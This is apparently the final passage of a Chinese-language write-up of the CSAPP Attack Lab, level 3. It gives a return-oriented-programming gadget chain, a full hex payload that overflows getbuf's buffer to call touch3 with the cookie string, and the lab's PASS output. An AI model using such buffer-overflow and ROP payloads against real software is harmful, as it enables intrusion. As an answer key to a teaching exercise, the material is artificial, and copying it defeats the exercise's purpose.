movq %rax, %rdi # 把%rsp 放到 %rdi 48 89 c7

popq %rax # 58
0x48 # 对应字符串首地址与%rsp的偏移地址 bias
movl %eax, %edx
movl %edx, %ecx
movl %ecx, %esi
lea    (%rdi,%rsi,1),%rax
movq %rax, %rdi
touch3 #地址
35 39 62 39 39 37 66 61 00 #字符串首地址
```

关于为什么所计算的`bias`是`0x48`，是在其`getbuf`返回地址之后，是执行第一句`movq %rsp, %rax`时，由于每一个`gadget`后面会跟着`retq`指令的，所以在执行第一句时，`%rsp`已经是指向下一句了，即是在执行第一句`movq %rsp, %rax`赋值给`rax`的值即是从第二句开始的，所以是按照第二句`movq %rax, %rdi`的地址进行偏移的，偏移到`0x48`到`cookie`字符串的位置

开始构建我们的答案

```shell
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 # 填补40字节缓冲区，getbuf的栈顶

06 1a 40 00 00 00 00 00 # <-- rsp
a2 19 40 00 00 00 00 00 # <-- rsp +0x00
cc 19 40 00 00 00 00 00 # <-- rsp +0x08
48 00 00 00 00 00 00 00 # <-- rsp +0x10

dd 19 40 00 00 00 00 00 # <-- rsp +0x18
70 1a 40 00 00 00 00 00 # <-- rsp +0x20
13 1a 40 00 00 00 00 00 # <-- rsp +0x28
d6 19 40 00 00 00 00 00 # <-- rsp +0x30
a2 19 40 00 00 00 00 00 # 以上就是将cookie字符串的地址，给到%rdi <-- rsp +0x38

fa 18 40 00 00 00 00 00 # touch3 的首地址 <-- rsp +0x40
35 39 62 39 39 37 66 61 00 # 存放cookie 字符串 <-- rsp +0x48
```

测试PASS！！！

```assembly
dargon@dd:~/桌面/CSAPP/lab3_attack/target1$ ./rtarget < ans5_raw.txt -q
Cookie: 0x59b997fa
Type string:Touch3!: You called touch3("59b997fa")
Valid solution for level 3 with target rtarget
PASS: Would have posted the following:
	user id	bovik
	course	15213-f15
	lab	attacklab
	result	1:PASS:0xffffffff:rtarget:3:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 06 1A 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 CC 19 40 00 00 00 00 00 48 00 00 00 00 00 00 00 DD 19 40 00 00 00 00 00 70 1A 40 00 00 00 00 00 13 1A 40 00 00 00 00 00 D6 19 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 FA 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61 00 
```



>终于将Attack Lab整理完了~